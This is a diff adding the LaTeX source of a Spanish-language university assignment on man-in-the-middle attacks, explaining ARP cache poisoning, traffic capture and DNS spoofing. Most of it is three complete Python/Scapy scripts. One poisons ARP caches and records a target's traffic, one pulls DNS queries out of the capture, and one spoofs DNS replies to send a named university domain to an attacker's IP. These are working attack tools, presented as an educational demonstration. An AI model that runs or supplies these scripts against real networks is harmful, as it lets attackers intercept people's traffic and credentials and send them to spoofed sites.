@@ -1,0 +1,339 @@
+\documentclass[a4paper, 13pt]{article}
+\usepackage[utf8]{inputenc} %Se usa para que admita texto con tildes
+\usepackage[T1]{fontenc}	%Se usa para que admita texto con tildes
+\usepackage{amsmath}
+\usepackage{listings}
+\usepackage{color}	%Se usa para definir colores en el documento
+\usepackage{ulem}	%Se usa para poner código en el documento.
+\usepackage{bm}	%Se usa para hacer expresiones matemáticas en negrita
+\usepackage[a4paper,vmargin=2.54cm,hmargin=2cm]{geometry}
+\usepackage{diagbox}	%Se usa para hacer la linea diagonal dentro de la celda de una tabla
+
+\usepackage{mwe}		%Se usa para poner imagenes dentro de tablas.
+\usepackage{graphicx}	%Se usa para cargar imágenes
+
+\usepackage{mathtools}	%se usa para hacer recuadros dentro de align con \Aboxed{}
+\usepackage{chngcntr}	%se usa para resetear el contador de ecuaciones
+\newcommand{\ts}{\textsuperscript}	%Se usa para poner 1st, 2nd, 3rd, etc
+
+%configuracion de package {chngcntr}
+\counterwithin*{equation}{section}
+\counterwithin*{equation}{subsection}
+
+%Definición de colores para el documento
+\definecolor{dkgreen}{rgb}{0,0.6,0}
+\definecolor{gray}{rgb}{0.5,0.5,0.5}
+\definecolor{mauve}{rgb}{0.58,0,0.82}
+%Definicion de ulem para el código
+\lstset{
+	language=Python,
+	aboveskip=3mm,
+	belowskip=3mm,
+	showstringspaces=false,
+	columns=flexible,
+	basicstyle={\ttfamily},
+	numbers=left,
+	numberstyle=\tiny\color{gray},
+	keywordstyle=\color{blue},
+	commentstyle=\color{dkgreen},
+	stringstyle=\color{mauve},
+	breaklines=true,
+	breakatwhitespace=true,
+	tabsize=3
+}
+
+\title{Análisis de Algoritmos}
+\author{Juan Aparicio, Emiliano Fernandez}
+
+\begin{document}
+	\begin{titlepage}
+		\centering
+		\includegraphics[width=0.15\textwidth]{logo-ude.png}\par\vspace{1cm}
+		{\scshape\LARGE Universidad de la Empresa \par}
+		\vspace{3cm}
+		{\huge\bfseries Trabajo Obligatorio\par}
+		\vspace{2cm}
+		{\Large\itshape Juan Aparicio\par}
+		\vfill
+		Profesor \par
+		Pablo Martres
+		
+		\vfill
+		
+		% Bottom of the page
+		{\large \today\par}
+	\end{titlepage}
+	\tableofcontents
+	\newpage
+	\section{Introducción}
+	\par El tema de este trabajo es el análisis de una familia de vulnerabilidades existentes en las redes informáticas hoy en día. Con el crecimiento de la popularidad de las redes Wi-Fi públicas, los ataques Man-in-the-middle son muy fáciles de hacer, y junto a este otra serie de ataques que pueden robar información valiosa como por ejemplo: credenciales de autenticación a páginas web, tipo de dispositivo desde el cual se está accediendo, los sitios visitados y más.
+	\par A continuación se presentarán tres de los posibles ataques que se pueden hacer combinado con un ataque Man-in-the-Middle, y por que es que se pueden hacer.
+	
+	\section{Man-in-the-Middle}
+	\par Este ataque es la base del resto de los ataques que se presentarán en este documento.
+	\par Este ataque se basa en retransmitir y posiblemente alterar la comunicación entre 2 computadoras que piensan que estan comunicandose directamente uno con otro.
+	\par Para llevar a cabo este ataque, se toma ventaja del protocolo ARP que se usa en todas las redes informáticas. Lo que se hace es un \textit{ARP cache poisoning} para que la computadora piense que la computadora del atacante piense que es la puerta de enlace y envíe el tráfico a la computadora del atacante, y este retransmitirla.
+	
+	\section{Protocolo ARP (Address Resolution Protocoll)}
+	\par Cuando nos conectamos a otra máquina en la red local, usualmente se usa su hostname, domain name o dirección IP. En nuestro ataque, antes de que el paquete pueda ser enviado de la máquina del atacante a la máquina objetivo, la máquina del atacante debe mapear la dirección ip de la máquina objetivo a la MAC para que la máquina del atacante sepa a qué parte de la red enviar el paquete. Para hacer esto, se envía un ARP broadcast de “who has IP addess 192.168.20.10” en la red local. La maquina con la direccion IP 192.168.20.10 responde “yo tengo la direccion 192.168.20.10 y mi MAC es 00:0C:29:A9:CE:92”. La máquina del atacante va a guardar el mapeo de la IP 192.168.20.10 y la MAC 00:0C:29:A9:CE:92 en su ARP cache.
+	
+	\par Cuando se envíe el siguiente paquete, nuestra máquina va a fijarse primero en su ARP cache por la entrada de la IP 192.168.20.10. Si encuentra una, va a usar esa como la dirección del objetivo, en lugar de enviar un ARP Broadcast (Como la topología de la red puede estar cambiando constantemente, las entradas en la cache de la tabla ARP se actualizan regularmente). Por lo tanto los sistemas van a estar enviando ARP broadcast a medida que sus caches se van vaciando. El atacante se aprovecha de este refrescado periódico para hacer el envenenamiento de la cache ARP.
+	
+	\par Para ver la tabla ARP cacheada en la máquina se puede usar el comando arp -a en Windows y sistemas UNIX.
+	
+	\subsection{Ataque ARP poisoning}
+	\par La vulnerabilidad en el sistema ARP, es que no existe una garantía de que la respuesta de dirección MAC que recibe viene efectivamente de la máquina que tiene esa dirección MAC. La máquina va a aceptar la respuesta de todas formas como verdadera.
+	
+	\par Para envenenar la tabla ARP, lo que hace la máquina atacante es enviar constantemente una serie de respuestas ARP que le dicen a la máquina objetivo que la máquina del atacante (la nuestra) es otra en la red. De esta forma, la máquina objetivo envía el tráfico a nuestra máquina, porque piensa que es otra.
+	
+	\section{Ataques combinados con Man-in-the-Middle}
+	\par Una vez que se tiene una computadora posicionada lógicamente en el medio del canal de comunicación de otras 2, se podría llevar a cabo los siguiente ataques:
+	\begin{enumerate}
+		\item Denial of Service.
+		\item Captura de tráfico de red.
+		\item DNS spoofing.
+	\end{enumerate}
+	
+	\subsection{Denial of Service}
+	\par Una vez que se posicionó la máquina del atacante entre medio de las otras dos, si se quiere hacer un \textit{denial of service}, no hay que hacer nada más. Este ataque consiste en denegarle un servicio a una pc en la red. El servicio que se estaría negando en este caso sería el de la transmisión de datos entre las 2 pcs. Para que no se produzca un denial of service y pase a ser un simple Man-in-the-Middle, lo único que hay que hacer es hacer un IP forwarding de los paquetes ajenos al destino correcto.
+	
+	\subsection{Captura de tráfico de red}
+	\par Consiste en ponerse entre medio de las 2 máquinas, habilitar el IP Forwarding y los paquetes externos guardarlos en algún tipo de archivo para su posterior análisis.
+	
+	\subsection{DNS Spoofing}
+	\par Una vez que se está en el medio de las máquinas con el Man-in-the-Middle, lo que se hace es capturar el tráfico que recibe la máquina por el puerto 53, inspeccionar la respuesta del DNS, modificarla y reenviarla al destinatario. El destinatario no tiene una forma de saber si el paquete fue modificado en el medio, entonces toma la respuesta como válida y verdadera.
+	
+	\section{Programas para efectuar los ataques}
+	\par Aunque existen distintos programas para efectuar todos estos ataques, se decidió hacer programas propios para demostrar el funcionamiento y la teoría de los ataques.
+	\par Para hacer los scripts se usó el lenguaje Python 3, junto con las librerías Scapy y LibnetFilterQueue. Se usó Python por su facilidad de uso y porque ya existen librerías muy potentes cuyo propósito es el análisis de tráfico de red y paquetes.
+	\par Para poder utilizar los programas es necesario tener lo siguiente:
+	\begin{itemize}
+		\item Linux (cualquier distribución, preferiblemente Arch)
+		\item Python 3 instalado.
+		\item Python pip.
+		\item Scapy (librería de Python).
+		\item Implementación de LibnetFilterQueue para Python instalada.
+		\item iptables instalado.
+		\item nmap (o similar) para poder descubrir los dispositivos en la red.
+	\end{itemize}
+	
+	\subsection{Programa para hacer ARP poisoning y capturar el tráfico}
+	\par Este primer script tiene 4 variables que se deben cambiar para poder ejecutarlo. Ellas son:
+	\begin{enumerate}
+		\item \verb|gateway_ip|: Esta es la ip de la gateway de la red.
+		\item \verb|target_ip|: Esta es la ip de la computadora que se quiere atacar.
+		\item \verb|packet_count|: Esta es la cantidad de paquetes que se quieren sniffear, si se setea a 0 se sniffea indefinidamente.
+		\item \verb|interface|: Es la interfaz desde la cual se quiere sniffear.
+	\end{enumerate}
+	\begin{lstlisting}
+	from scapy.all import *
+	import os
+	import signal
+	import sys
+	import threading
+	import time
+	
+	#Parametros del programa
+	gateway_ip = "192.168.0.1"
+	target_ip = "192.168.0.104"
+	packet_count = 0
+	interface = "wlp2s0"
+	
+	#Configuracion inicial
+	conf.iface = interface
+	conf.verb = 0
+	
+	#Descripcion: Dada una direccion IP, obtiene la direccion MAC. Lo que hace es hacer un ARP Broadcast
+	#y recibe una respuesta ARP con la direccion MAC.
+	#Entrada:   Direccion IP
+	#Salida:    Direccion MAC
+	def get_mac(ip_address):
+		#Armo una request de tipo ARP. Esta request se la paso a la funcion sr, que lo que hace es enviar y recibir paquetes
+		#de capa 3
+		ret = None
+		resp, unans = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip_address), retry=2, timeout=10)
+		
+		for s,r in resp:
+			print("entre")
+			if(ret == None):
+				ret =  r[ARP].hwsrc
+		return ret
+	
+	
+	#Restaura la red revirtiendo el envenenamiento de ARP. Lo que hace es Hacer un broadcast ARP con la 
+	#direccion MAC e IP correctas.
+	#Entradas:  Direccion IP del gateway, Direccion MAC del gateway, Direccion IP del objetivo, Direccion MAC del objetivo
+	#Salida:    void 
+	def restore_network(gateway_ip, gateway_mac, target_ip, target_mac):
+		send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=gateway_ip, hwsrc=target_mac, psrc=target_ip), count=5)
+		send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=target_ip, hwsrc=gateway_mac, psrc=gateway_ip), count=5)
+		print("[*] Deshabilitando IP forwarding")
+		#Deshabilito el redireccionamiento de red de la pc mia.
+		os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
+		#mato el proceso del script
+		os.kill(os.getpid(), signal.SIGTERM)
+	
+	#Sigo enviando respuestas de ARP falsas para poner mi pc en el medio.
+	#Entrada:   Direccion IP del gateway, Direccion MAC del gateway, Direccion IP del objetivo, Direccion MAC del objetivo
+	#Salida:    void
+	def arp_poison(gateway_ip, gateway_mac, target_ip, target_mac):
+		print("[*] Empezado el ataque ARP poisoning [CTRL-C para parar]")
+		try:
+			while True:
+				send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip))
+				send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip))
+				time.sleep(2)
+		except KeyboardInterrupt:
+			print("[*] Se detuvo el ataque ARP poison. Restaurando la red...")
+			restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
+	
+	#Inicio el script
+	print("[*] Comenzando Script: arp_poison.py")
+	print("[*] Habilitando IP Forwarding")
+	#Habilito el redireccionamiento de red en mi pc
+	os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+	print(f"[*] Gateway IP: {gateway_ip}")
+	print(f"[*] Target IP : {target_ip}")
+	
+	#Obtengo la direccion MAC del gateway
+	gateway_mac = get_mac(gateway_ip)
+	if gateway_mac is None:
+		print("[!] No es posible obtener la direccion MAC de la gateway. Saliendo..")
+		sys.exit(0)
+	else:
+		print(f"[*] Direccion MAC de la gateway: {gateway_mac}")
+	
+	#Obtengo la direccion MAC de la maquina objetivo
+	target_mac = get_mac(target_ip)
+	if target_mac is None:
+		print("[!] No es posible obtener la direccion MAC del objetivo. Saliendo..")
+		sys.exit(0)
+	else:
+		print(f"[*] Direccion MAC del objetivo: {target_mac}")
+	
+	#Inicio el hilo que hace el envenenamiento ARP
+	poison_thread = threading.Thread(target=arp_poison, args=(gateway_ip, gateway_mac, target_ip, target_mac))
+	poison_thread.start()
+	
+	#Leo el trafico y lo escribo en el archivo pcap
+	try:
+		#Seteo un filtro que sea donde obtengo los paquetes que tienen como ip host la maquina objetivo
+		sniff_filter = "ip host " + target_ip
+		print(f"[*] Comenzando captura de paquetes. Cantidad de paquetes: {packet_count}. Filter: {sniff_filter}")
+		packets = sniff(filter=sniff_filter, iface=conf.iface, count=packet_count)
+		#Escribo los paquetes (la cantidad que haya seteado en los parametros de configuracion) 
+		#que intercepto a un archivo pcap
+		wrpcap(target_ip + "_capture.pcap", packets)
+		print(f"[*] Deteniendo la captura de paquetes.. Restaurando red..")
+		restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
+	except KeyboardInterrupt:
+		print(f"[*] Se detuvo la captura de red.. Restaurando red..")
+		#Una vez que presiono ctrl + c restauro la red a su estado inicial
+		restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
+		sys.exit(0)
+	\end{lstlisting}
+	
+	\subsection{Programa para el análisis de la captura de tráfico}
+	\par Este segundo script tiene 1 variable que se deben cambiar para poder ejecutarlo. Esta es: \verb|rutaArchPCAP|: Es un string con la ruta al archivo \verb|.pcap| conteniendo el tráfico sniffeado que generó el script anterior.
+	\begin{lstlisting}
+	from scapy.all import *
+	import sys
+	
+	rutaArchPCAP='./192.168.0.104_capture.pcap'
+	opcion = 0
+	archPCAP = rdpcap(rutaArchPCAP)
+	
+	#Funciones
+	def historial():
+		# Itero las sesiones en el trafico de red.
+		for session in archPCAP:
+			# Itero los paquetes de la sesion
+			for packet in session:
+			try:
+				# Si el paquete tiene la capa de DNS, entonces accedo 
+				# e imprimo la query hecha al servidor DNS
+				if(packet[DNS]):
+					print(packet[DNS].qd.qname)
+			except IndexError:
+				pass
+	
+	#Para ver el historial
+	if(opcion == 0):
+		historial()
+	\end{lstlisting}
+	
+	
+	\subsection{Programa para el spoofeo de DNS}
+	\par Este tercer script tiene 2 variables que se deben cambiar para poder ejecutarlo. Ellas son:
+	\begin{enumerate}
+		\item \verb|domain|: Este es el dominio que se quiere spoofear.
+		\item \verb|ipSpoofeada|: Esta es la ip a la que se va a redirigir cuando se haga una consulta DNS conteniendo el dominio que tiene \verb|domain|.
+	\end{enumerate}
+	\begin{lstlisting}
+	from netfilterqueue import NetfilterQueue
+	from scapy.all import *
+	import os
+	
+	#Este es el dominio que quiero spoofear
+	domain      = 'plataforma-fi.ude.edu.uy'
+	
+	#Esta es la ip a la que voy a redirigir
+	ipSpoofeada = '192.168.0.102'
+	
+	#Regla de IP tables para que los paquetes forwardeados por mi PC con puerto de destino 53 se encolen.
+	os.system('iptables -A FORWARD -p udp --dport 53 -j NFQUEUE --queue-num 1') 
+	
+	#Funcion que se ejecuta cada vez que se encola un paquete.
+	#Entrada: paquete de NFQUEUE
+	#Salida: ninguno. adentro acepta el paquete o lo dropea y envia uno spoofeado
+	def callback(p):
+		# Parseo el paquete de NFQUEUE a un paquete entendible por Scapy
+		pkt = IP(p.get_payload())
+		try:
+			#Si el paquete tiene la capa DNS
+			if(pkt["DNS"]):   
+				# Me fijo si es una pregunta o respuesta de DNS y lo intercepto
+				if pkt.qdcount > 0 and isinstance(pkt.qd, DNSQR):
+					name = pkt.qd.qname
+				elif pkt.ancount > 0 and isinstance(pkt.an, DNSRR):
+					name = pkt.an.rdata
+				else:
+					print("")
+				#Si la query tiene el nombre que quiero spoofear en el DNS, lo intercepto, hago un nuevo paquete
+				# y mando mi paquete spoofeado
+				if(domain in str(name)):
+					spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
+						UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
+						DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, qr=1, \
+						an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=100, rdata=ipSpoofeada)) 
+						
+					send(spoofed_pkt)
+					
+					print("Paquete spoofeado enviado para: " + name)
+				else:
+					#Si no es una direccion que quiero spoofear acepto el paquete.
+					print("Paquete aceptado para la url: " + name)
+					p.accept()
+		except:
+			#Si ocurrio una excepcion no hago nada
+			pass
+	
+	
+	#Hilo principal de ejecucion.        
+	def main():
+		#Creo una cola para los paquetes
+		NFQUEUE = NetfilterQueue()
+		#Adjunto la cola creada con un callback y al numero 1
+		NFQUEUE.bind(1, callback)
+		try:
+			NFQUEUE.run() # Pongo a correr la cola de paquetes
+		except KeyboardInterrupt:
+			#Si cancelo el programa limpio las reglas del IP tables que cree.
+			NFQUEUE.unbind()
+			os.system('iptables -F')
+			os.system('iptables -X')
+			sys.exit('Cerrando...')
+	#Ejecucion del programa.
+	main()
+	\end{lstlisting}
+\end{document}
